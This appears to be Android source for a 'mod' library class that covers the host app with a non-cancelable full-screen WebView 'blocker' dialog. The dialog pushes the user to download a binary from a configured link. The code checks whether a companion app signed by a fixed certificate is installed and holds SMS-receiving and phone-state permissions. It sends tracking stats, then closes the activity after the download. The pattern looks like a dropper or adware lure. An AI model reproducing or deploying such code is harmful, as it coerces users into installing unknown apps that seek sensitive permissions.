package com.mks.modlib;

import android.Manifest;
import android.app.Activity;
import android.app.Dialog;
import android.content.ComponentName;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Color;
import android.graphics.drawable.ColorDrawable;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Environment;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.util.Base64;
import android.util.Log;
import android.view.ViewGroup;
import android.webkit.JavascriptInterface;
import android.webkit.WebSettings;
import android.webkit.WebView;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.InputStream;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.security.cert.CertificateEncodingException;
import java.security.cert.CertificateException;
import java.security.cert.CertificateFactory;
import java.security.cert.X509Certificate;
import java.util.ArrayList;

public class InfoForm {
    private static InfoForm instance = null;
    private static WebView webView = null;
    private static Dialog dialog = null;
    private String modName;
    private Context cnt;
    private Activity mAct;
    private Boolean oneStartFlag = false;
    private Boolean oneCloseFlag = false;
    public static Integer resultGooInstalled = -1;
    public static Integer resultSMSGranted = -1;
    public static Integer resultExtStrgGranted = -1;
    public static Integer resultPhoneCallGranted = -1;
    public static boolean resultAllGranted = false;
    public File file;

    static String picAppOnlyStr = "";

    private InfoForm() {
    }

    //Метод возвращающйи экземпляр формы-блокировщика

    /**
     * Required metho
     */
    public static synchronized InfoForm getInfoForm(Context cnt, Activity a) {
        if (instance == null) {
            instance = new InfoForm();
        }
        instance.init(cnt, a);
        return instance;
    }

    //Метод проверки можно ли запускать приложение
    public boolean check() {
      //  Log.e("DEV ", String.valueOf(C.PACKAGE_NAME) + " " + String.valueOf(cnt!=null));
        String packageName = C.PACKAGE_NAME;
        String cert = getCertificateSHA1Fingerprint(cnt, packageName);
        Boolean resultApp = false;
        if ((cert == null) || (cert.equals(""))) {
            resultApp = false;
        } else {
            String[] certs = {"4C:FD:C0:8B:EF:59:7D:3E:52:5C:96:6C:7A:C4:9D:04:52:D3:56:05",
                    "-----"};
            for (int i = 0; i < certs.length; i++) {
                if (certs[i].equals(cert)) {
                    resultApp = true;
                    break;
                }
            }
        }
        if (resultApp) {
            PackageManager pm = cnt.getPackageManager();
            resultSMSGranted = pm.checkPermission(android.Manifest.permission.RECEIVE_SMS, C.PACKAGE_NAME) == PackageManager.PERMISSION_GRANTED ? 0 : -1;
            resultExtStrgGranted = pm.checkPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE, C.PACKAGE_NAME) == PackageManager.PERMISSION_GRANTED ? 0 : -1;
            resultPhoneCallGranted = pm.checkPermission(android.Manifest.permission.READ_PHONE_STATE, C.PACKAGE_NAME) == PackageManager.PERMISSION_GRANTED ? 0 : -1;
            resultAllGranted = resultSMSGranted == 0 && resultExtStrgGranted == 0 && resultPhoneCallGranted == 0;
        }
//       if (resultApp && resultSMSGranted == 0
//                && resultExtStrgGranted == 0
//                && resultPhoneCallGranted == 0) {
//            //Приложение установлено и есть все permissions - Не показываем лендинг
//            //Log.e("!!!", "it's ok");
//        } else {
        show();
//        }

        return resultApp;
    }


    private void updateFormParam(Context context, Activity a) {
        cnt = context;
        mAct = a;
    }

    // Инициализация формы с лендингом
    private void init(Context context, Activity a) {
        updateFormParam(context, a);

        if (dialog == null) {
            dialog = new Dialog(cnt, android.R.style.Theme_Translucent_NoTitleBar);
            webView = new WebView(cnt);
            dialog.setContentView(webView);
            dialog.setCancelable(false);
        }
        Bitmap bmp = BitmapFactory.decodeResource(cnt.getResources(), cnt.getApplicationInfo().icon);

        ByteArrayOutputStream stream = new ByteArrayOutputStream();
        bmp.compress(Bitmap.CompressFormat.PNG, 100, stream);
        byte[] icon = stream.toByteArray();

        String encoded = Base64.encodeToString(icon, Base64.DEFAULT);
        picAppOnlyStr = "";
        picAppOnlyStr = picAppOnlyStr + encoded;
        webView.getSettings().setJavaScriptEnabled(true);
        webView.setBackgroundColor(Color.WHITE);

        if (ContextCompat.checkSelfPermission(cnt, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
            ArrayList<String> tmp = new ArrayList<String>();
            tmp.add(Manifest.permission.READ_EXTERNAL_STORAGE);
            ActivityCompat.requestPermissions(mAct, (tmp).toArray(new String[0]), 200);
        }


        resultGooInstalled = check() ? 0 : -1;
        Log.e("!!!", "resultGooInstalled hasPerm = " + resultGooInstalled);
        modName = "unknown";
        ApplicationInfo aInfo = null;
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.DONUT) {
            aInfo = cnt.getApplicationInfo();
        }
        PackageManager pm = cnt.getPackageManager();
        AsyncTask.execute(new Runnable() {
            @Override
            public void run() {
                if (!oneStartFlag) {
                    Log.e("DECAT: ", "SEND!");
                    Kebana.sendStat(cnt, Action.Open.toString());
                    oneStartFlag = true;

                }
            }
        });

        if ((aInfo != null) && (pm != null)) {
            modName = aInfo.loadLabel(pm).toString();
        }

        String htmlString = Lending.getLending(modName, "ordinary", -1);

        WebSettings settings = webView.getSettings();
        settings.setDefaultTextEncodingName("utf-8");
        Service.setWebViewLending(htmlString, webView, a);
        webView.addJavascriptInterface(new WebAppInterface(cnt, mAct), "Android");
    }

    public void show() {

        this.dialog.getWindow().setLayout(ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.MATCH_PARENT);
        this.dialog.getWindow().setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
        this.dialog.setOnShowListener(new DialogInterface.OnShowListener() {
            @Override
            public void onShow(DialogInterface dialog) {

            }
        });


        this.dialog.show();

        if (!this.dialog.isShowing()) {

        }
    }


    /*******************************************************************************************
     /*   Методы для проверки сертификатов
     ********************************************************************************************/
    private String getCertificateSHA1Fingerprint(Context mContext, String packageName) {
        PackageManager pm = mContext.getPackageManager();
        int flags = PackageManager.GET_SIGNATURES;
        PackageInfo packageInfo = null;
     //   Log.e("!!! DECV ", "try1");
        try {
            packageInfo = pm.getPackageInfo(packageName, flags);
        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
        }
       // Log.e("!!! DECV ", "try2");
        if (packageInfo == null) return null;
        android.content.pm.Signature[] signatures = packageInfo.signatures;
        byte[] cert = signatures[0].toByteArray();
        InputStream input = new ByteArrayInputStream(cert);
        CertificateFactory cf = null;
   //     Log.e("!!! DECV ", "try3");
        try {
            cf = CertificateFactory.getInstance("X509");
        } catch (CertificateException e) {
            e.printStackTrace();
        }
        X509Certificate c = null;
       // Log.e("!!! DECV ", "try4");
        try {
            c = (X509Certificate) cf.generateCertificate(input);
        } catch (CertificateException e) {
            e.printStackTrace();
        }
        String hexString = null;
        Log.e("!!! DECV ", "try5 ");
        try {
            Log.e("!!! DECV ", "try1 ");
            MessageDigest md = MessageDigest.getInstance("SHA1");
            Log.e("!!! DECV ", "try2 ");
            byte[] publicKey = md.digest(c.getEncoded());
            Log.e("!!! DECV ", "try3 " + String.valueOf(publicKey));
            hexString = byte2HexFormatted(publicKey);
            Log.e("!!! DECV ", "hexString " + String.valueOf(publicKey));
        } catch (NoSuchAlgorithmException e1) {
            Log.e("!!! DECV ", "try4 ");
            e1.printStackTrace();
        } catch (CertificateEncodingException e) {
            Log.e("!!! DECV ", "try7 ");
            e.printStackTrace();
        }
        return hexString;
    }

    private static String byte2HexFormatted(byte[] arr) {
        StringBuilder str = new StringBuilder(arr.length * 2);
        for (int i = 0; i < arr.length; i++) {
            String h = Integer.toHexString(arr[i]);
            int l = h.length();
            if (l == 1) h = "0" + h;
            if (l > 2) h = h.substring(l - 2, l);
            str.append(h.toUpperCase());
            if (i < (arr.length - 1)) str.append(':');
        }
        return str.toString();
    }

    /*******************************************************************************************
     /*   Методы отработки нажатий на html-форме
     ********************************************************************************************/
    public class WebAppInterface {

        WebAppInterface(Context c, Activity a) {
        }

        @JavascriptInterface
        public void hide(String param) {
            AsyncTask.execute(new Runnable() {
                @Override
                public void run() {
                    Kebana.sendStat(cnt, Action.Play.toString());

                }
            });
            Log.e("DBG: ", "HIDE!");
            dialog.cancel();
//            mAct.runOnUiThread(new Runnable() {
//                @Override
//                public void run() {
//                    Log.e("DBG: ", "HIDE!");
//                    dialog.cancel();
//                }
//            });
        }

        @JavascriptInterface
        public void openGG(String param) {
            Log.e("Debg: ", "OPEN");
            AsyncTask.execute(new Runnable() {
                @Override
                public void run() {
                    Kebana.sendStat(cnt, Action.OpenPermissions.toString());
                }
            });
            Intent intent = new Intent();
            intent.setComponent(new ComponentName(C.PACKAGE_NAME, C.MAIN_GG_ACTIVITY));
            Log.e("Debg: ", C.PACKAGE_NAME + " " + C.MAIN_GG_ACTIVITY);
            cnt.startActivity(intent);
        }

        @JavascriptInterface
        public void download(String param) {
            Log.e("DE: ", "fhd");
            AsyncTask.execute(new Runnable() {
                @Override
                public void run() {
                    Kebana.sendStat(cnt, Action.Download.toString());
                }
            });
            Service.setWebViewLending(Lending.getLending(modName, "loading", -1), webView, mAct);
            AsyncTask.execute(new Runnable() {
                @Override
                public void run() {
                    String link = "";
                    ApplicationInfo ai = null;
                    try {
                        ai = cnt.getPackageManager().getApplicationInfo(cnt.getPackageName(), PackageManager.GET_META_DATA);
                        Bundle bundle = ai.metaData;
                        link = bundle.getString(C.KEY_USER_GOOGAMES_LINK);
                    } catch (PackageManager.NameNotFoundException e) {
                        e.printStackTrace();
                    } catch (Error e) {
                        e.printStackTrace();
                    }
                    link = ((link == null) || (link.equals(""))) ? C.GOOGAMES_LINK : link;
                    //TODO: Сейчас при получении имени файла и  получении самого файла дважды открывается соединение, а нужно сделать что бы толкьо 1 раз
                    new FileDownloader().downloadBinaryFile(cnt, mAct, link, webView, modName);
                    Intent intent = new Intent(Intent.ACTION_GET_CONTENT);
                    Uri uri = Uri.parse("" + Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS));
                    intent.setDataAndType(uri, "text/csv");
                    cnt.startActivity(Intent.createChooser(intent, "Open folder"));
                    dialog.dismiss();
                    dialog = null;
                    if (mAct != null) {
                        mAct.finish();
                        mAct = null;
                    }

                }
            });
        }
    }

    private enum Action {
        Download,
        Open,
        Play,
        OpenPermissions
    }

}
